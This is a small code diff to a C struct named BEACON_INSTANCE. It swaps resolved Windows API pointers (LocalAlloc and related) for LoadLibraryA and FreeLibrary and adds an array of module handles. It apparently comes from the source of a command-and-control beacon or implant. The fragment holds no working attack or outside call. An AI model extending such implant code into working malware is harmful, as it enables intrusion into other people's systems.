@@ -18,14 +18,14 @@
 typedef struct
 {
 	ULONG Id;
-
+	
 	struct
 	{
-		FUNC( LocalSize );
-		FUNC( LocalFree );
-		FUNC( LocalAlloc );
+		FUNC( FreeLibrary );
+		FUNC( LoadLibraryA );
 	} api;
 
+	HMODULE Module[ 3 ];
 } BEACON_INSTANCE, *PBEACON_INSTANCE;
 
 #include "setting.h"
